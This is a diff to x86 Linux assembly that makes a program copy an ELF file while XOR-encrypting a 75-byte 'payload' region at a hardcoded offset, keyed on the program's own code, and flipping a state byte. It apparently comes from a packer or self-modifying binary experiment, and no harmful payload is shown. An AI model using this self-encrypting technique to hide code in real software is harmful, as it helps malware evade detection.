@@ -121,6 +121,9 @@ main:
 
 global targetExec
 target_exec:
+    push    ebp
+    mov     ebp, esp
+    pop     ebp
     ret
 
 global firstExec
@@ -173,8 +176,94 @@ first_exec:
     js      .close_source_error
     mov     edi, eax                     ; save dest fd in edi
 
-    ; Copy loop (read from source, write to dest)
-.copy_loop:
+    ; Copy loop (elf file contents until payload)
+    push    dword 0
+.copy_loop_till_payload:
+    ; Read chunk from source
+    mov     eax, 3                       ; sys_read
+    mov     ebx, esi                     ; source fd
+    mov     ecx, buffer                  ; temp buffer
+    mov     edx, 1                       ; chunk size (1B)
+    int     0x80
+    
+    test    eax, eax
+    js      .copy_error                  ; eax<0 means error
+    
+    ; Write chunk to destination
+    mov     edx, 1                       ; bytes to write
+    mov     eax, 4                       ; sys_write
+    mov     ebx, edi                     ; dest fd
+    mov     ecx, buffer                  ; same buffer
+    int     0x80
+    
+    test    eax, eax
+    js      .copy_error
+
+    inc     dword [esp]
+    cmp     dword [esp], 12485         ; HARDCODED - payload addr in ELF
+    jae     .next
+    jmp     .copy_loop_till_payload
+
+.next:
+    pop     eax
+
+    ; Copy payload to buff
+    ; Pack buff (apply xor)
+    ; Copy buff to new file
+
+    ; Read chunk from source
+    mov     eax, 3                       ; sys_read
+    mov     ebx, esi                     ; source fd
+    mov     ecx, buffer                  ; temp buffer
+    mov     edx, 75                      ; chunk size (75B) - HARDCODED - payload size
+    int     0x80
+    
+    test    eax, eax
+    js      .copy_error                  ; eax<0 means error
+
+    ; PACK PAYLOAD
+    ; void xor(char* buf, size_t size, const char* key, size_t key_size)
+    push    512
+    push    main
+    push    75
+    push    buffer
+    call    pack
+    add     esp, 16
+
+    
+    ; Write chunk to destination
+    mov     edx, 75                      ; bytes to write
+    mov     eax, 4                       ; sys_write
+    mov     ebx, edi                     ; dest fd
+    mov     ecx, buffer                  ; same buffer
+    int     0x80
+    
+    test    eax, eax
+    js      .copy_error
+
+    ; MODIFY STATE
+    mov     eax, 3                       ; sys_read
+    mov     ebx, esi                     ; source fd
+    mov     ecx, buffer                  ; temp buffer
+    mov     edx, 1                      ; chunk size (1B) - state variable
+    int     0x80
+    
+    test    eax, eax
+    js      .copy_error                  ; eax<0 means error
+
+    mov     byte [buffer] , 1 
+    ; Write chunk to destination
+    mov     edx, 1                      ; bytes to write
+    mov     eax, 4                       ; sys_write
+    mov     ebx, edi                     ; dest fd
+    mov     ecx, buffer                  ; same buffer
+    int     0x80
+    
+    test    eax, eax
+    js      .copy_error
+
+    ; Copy loop (remaining file - after payload)
+.copy_loop_till_end:
     ; Read chunk from source
     mov     eax, 3                       ; sys_read
     mov     ebx, esi                     ; source fd
@@ -195,7 +284,7 @@ first_exec:
     
     test    eax, eax
     js      .copy_error
-    jmp     .copy_loop
+    jmp     .copy_loop_till_end
 
 .copy_done:
     ; Close both files
